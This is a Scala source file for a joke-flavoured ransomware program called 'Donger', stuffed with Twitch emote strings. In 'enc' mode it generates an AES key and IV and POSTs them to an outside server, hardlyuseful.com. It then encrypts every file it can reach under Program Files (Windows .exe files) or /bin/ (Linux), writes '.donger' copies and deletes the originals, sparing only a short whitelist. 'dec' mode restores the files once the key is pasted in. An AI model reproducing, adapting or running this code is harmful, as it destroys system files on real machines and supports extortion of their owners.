/**
 * Created by techy on 2/24/15.
 */

import java.io.{FileOutputStream, File, DataOutputStream}
import java.net.URL
import javax.crypto.Cipher
import javax.crypto.spec.{IvParameterSpec, SecretKeySpec}
import javax.net.ssl.HttpsURLConnection
import scala.util.Random
import java.net.HttpURLConnection
import scala.collection.JavaConversions._

abstract class Donger() {
  val msgs = List(" (っ-̶●̃益●̶̃)っWHY FORSAKE ME",
    "~(˘▾˘~) Wave Your Dongers (~˘▾˘)~",
    "ლ(́◉◞౪◟◉‵ლ) let me hold your donger for a while ლ(́◉◞౪◟◉‵ლ)",
    "(▀̿ ̿Ĺ̯̿̿▀̿ ̿) IM DONG,JAMES DONG (▀̿ ̿Ĺ̯̿̿▀̿ )",
    "(ง°ل͜°)ง I TRIED TO SILENCE MY DONGER ONCE; BOY THAT WENT WELL (ง°ل͜°)ง",
    "(ง ͡ʘ ͜ʖ ͡ʘ)ง GO RUSTY GO(ง ͡ʘ ͜ʖ ͡ʘ)ง",
    "My name Artour Babaev. Sorry bad englandsky. I grow up in small farm to have make potatos. Father say \"Arthour, potato harvest is bad. Need you to have play professional DOTO2 in Amerikanski for make money for head-scarf for babushka.\" I bring honor to komrade and babushka. Plz no copy pasteschniko",
    "༼ ºل͟º༼ ºل͟º༼ ºل͟º༼ ºل͟º ༽ºل͟º ༽ºل͟º ༽YOU CAME TO THE WRONG DONGERHOOD༼ ºل͟º༼ ºل͟º༼ ºل͟º༼ ºل͟º ༽ºل͟º ༽ºل͟º ༽",
    " ̿̿ ̿'̿'̵͇̿̿з=༼ ▀̿̿Ĺ̯̿̿▀̿ ̿ ༽=ε/̵͇̿̿/’̿’̿ ̿ ̿̿[} ̿ ̿ ̿ ̿^ Stop right there criminal scum! no one RIOTs on my watch. I'm confiscating your goods. now pay your fine, or it's off to jail. ",
    "༼ ºل͟º༽ I DIDN'T CHOOSE THE DONGLIFE, THE DONGLIFE CHOSE ME ༼ ºل͟º༽ ",
  "୧༼ಠ益ಠ༽୨ NOW WE RIOT ୧༼ಠ益ಠ༽୨")
  private val random = new Random
  private val URL = "https://hardlyuseful.com/donger"
  def encrypt(data: Array[Byte], secret:Array[Byte], iv:Array[Byte]): Array[Byte] = {
    val key = new SecretKeySpec(secret, "AES")
    val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
    cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv))
    cipher.doFinal(data)
  }
  def decrypt(data: Array[Byte], secret:Array[Byte], iv:Array[Byte]): Array[Byte] = {
    val key = new SecretKeySpec(secret, "AES")
    val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
    cipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(iv))
    cipher.doFinal(data)
  }
  def toByteArray(file: File): Array[Byte] = {
    val source = scala.io.Source.fromFile(file, "ISO-8859-1")
    val byteArray = source.map(_.toByte).toArray
    source.close()
    byteArray
  }
  def getMessage():String = msgs(random.nextInt(msgs.length))

  def getFileTree(f: File): Stream[File] =
    f #:: (if (f.isDirectory) {
      f.listFiles() match {
        case null => Stream.empty
        case x => x.toStream.flatMap(getFileTree).filter(p => p.isFile)
      }
    }
    else Stream.empty)

  def kappa(key: String, iv:String, msg:String): Int =  {
    val url = new URL(URL)
    val con = (url.openConnection()).asInstanceOf[HttpsURLConnection]
    con.setRequestProperty("User-Agent", "Kappa Face (no space)")
    con.setRequestProperty("Accept-Language", "en-US,en;q=0.5")
    val urlParameters = s"key=${key}&iv=${iv}&msg=$msg"
    con.setDoOutput(true)
    val wr = new DataOutputStream(con.getOutputStream())
    wr.writeBytes(urlParameters)
    wr.flush()
    wr.close()
    con.getResponseCode()
  }
  def kappa(msg:String): Int = {
    val url = new URL(URL)
    val con = (url.openConnection()).asInstanceOf[HttpsURLConnection]
    con.setRequestProperty("User-Agent", "Kappa Face (no space)")
    con.setRequestProperty("Accept-Language", "en-US,en;q=0.5")
    val urlParameters = s"msg=$msg"
    con.setDoOutput(true)
    val wr = new DataOutputStream(con.getOutputStream())
    wr.writeBytes(urlParameters)
    wr.flush()
    wr.close()
    con.getResponseCode()
  }

  def raiseDonger(option: String)
}
object Donger {
  val KEYSIZE = 16
  val IVSIZE = 16
  def main(args: Array[String]) {
    var donger:Donger = null
    val random = new Random

    if(args.length != 1) {
      println("Usage: java -jar donger.jar enc|dec")
      return
    }

    var key:Array[Byte] = new Array[Byte](KEYSIZE)
    var IV:Array[Byte] = new Array[Byte](IVSIZE)
    if(args(0) == "enc") {
      random.nextBytes(key)
      random.nextBytes(IV)
    }
    else if(args(0) == "dec") {
      val keyStr = Console.readLine("Paste key:")
      if(keyStr.length != 32) {
        println("Invalid key size")
        return
      }
      val ivStr = Console.readLine("Paste IV:")
      if(ivStr.length != 32) {
        println("Invalid iv size")
      }
      key = this.unhex(keyStr)
      IV = this.unhex(ivStr)
    } else {
      println("Usage: java -jar donger.jar enc|dec")
      return
    }
    if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
      donger = new WindersDonger(key, IV)
    } else {
      donger = new LinuxDonger(key, IV)
    }
    donger.raiseDonger(args(0))
  }
  def hex(buf: Array[Byte]): String = buf.map("%02X" format _).mkString
  def unhex(hex:String):Array[Byte] =
    hex.replaceAll("[^0-9A-Fa-f]", "")
      .sliding(2, 2).toArray
      .map(Integer.parseInt(_, 16).toByte)
}

class WindersDonger(key: Array[Byte], iv:Array[Byte]) extends Donger {
  val DIR = List[String](System.getenv("ProgramFiles"))
//  val DIR = List[String](System.getProperty("user.home"),System.getenv("WINDIR") + "\\system32")
  val WINDERS_WHITELIST = List[String]("java.exe", "cmd.exe", "ntlm.sys", "Common Files")
  def raiseDonger(option: String) {
    println("(ง ͠ ͠° ل͜ °)ง  WINDERS DONGER RAISED, SIR")
    option match {
      case "enc" => {
        kappa(Donger.hex(key), Donger.hex(iv), getMessage)
        for(dir <- DIR) {
          doEnc(dir, WINDERS_WHITELIST)
        }
      }
      case "dec" => {
        kappa("Decrypting =[")
        for(dir <- DIR) doDec(dir)
      }
    }
  }
  def doEnc(entryDir: String, whiteList: List[String]) {
    getFileTree(new File(entryDir)).foreach(
      f => {
        if(!f.isDirectory && !f.toString.contains(".donger") && !whiteList.contains(f.toString) && f.toString.contains(".exe")) {
          var out:FileOutputStream = null
          try {
            val outBytes = encrypt(toByteArray(f), key,iv)
            out = new FileOutputStream(f.toString + ".donger")
            out.write(outBytes)
          } catch {
            case e:Exception => println(e.toString)
          } finally {
            f.delete
            if(out != null) out.close
          }
        }
      })
  }

  def doDec(entryDir: String) {
    getFileTree(new File(entryDir))
      .filter(p => p.toString.contains(".donger")).foreach(
        f => {
          var out:FileOutputStream = null
          try {
            val outBytes = decrypt(toByteArray(f), key, iv)
            out = new FileOutputStream(f.toString.split(".donger")(0))
            out.write(outBytes)
          } catch {
            case e:Exception => println("error in doDec" + e.toString)
          } finally {
            if(out != null) out.close
          }
      })
  }
}
class LinuxDonger(key: Array[Byte], iv:Array[Byte]) extends Donger {
  val LINUX_WHITELIST = List[String](
    "cat", "wall", "echo", "bash", "ifconfig", "chmod", "rm",  "openssl", "java"
  )
  val DIR = List[String](
    "/bin/")
  def raiseDonger(option: String) {
    println(" (ง ͠ ͠° ل͜ °)ง LINUS DONGER RAISED, SIR (ง ͠ ͠° ل͜ °)ง")
    option match {
      case "enc" => {
        kappa(Donger.hex(key), Donger.hex(iv), getMessage)
        for(dir <- DIR) doEnc(dir, LINUX_WHITELIST)
      }
      case "dec" => {
        kappa("Decrypting =[")
        for(dir <- DIR) doDec(dir)
      }
    }
  }
  def doEnc(entryDir: String, whiteList: List[String]) {
    getFileTree(new File(entryDir)).foreach(
      f => {
        if(!f.isDirectory && !f.toString.contains(".donger") &&
          !LINUX_WHITELIST.contains(f.getName)) {
          var out:FileOutputStream = null
          try {
            val outBytes = encrypt(toByteArray(f), key,iv)
            out = new FileOutputStream(f.toString + ".donger")
            out.write(outBytes)
            out.close
          } catch {
            case e:Exception => println(e.toString)
          } finally {
            f.delete
            if(out != null) out.close
          }
        }
      })
  }

  def doDec(entryDir: String) {
    getFileTree(new File(entryDir)).filter(p => p.toString.contains(".donger")).foreach(
      f => {
        var out:FileOutputStream = null
        try {
          val outBytes = decrypt(toByteArray(f), key, iv)
          out = new FileOutputStream(f.toString.split(".donger")(0))
          out.write(outBytes)
          out.close
        } catch {
          case e:Exception => println(e.toString)
        } finally {
          if(out != null) out.close
        }
      })
  }
}
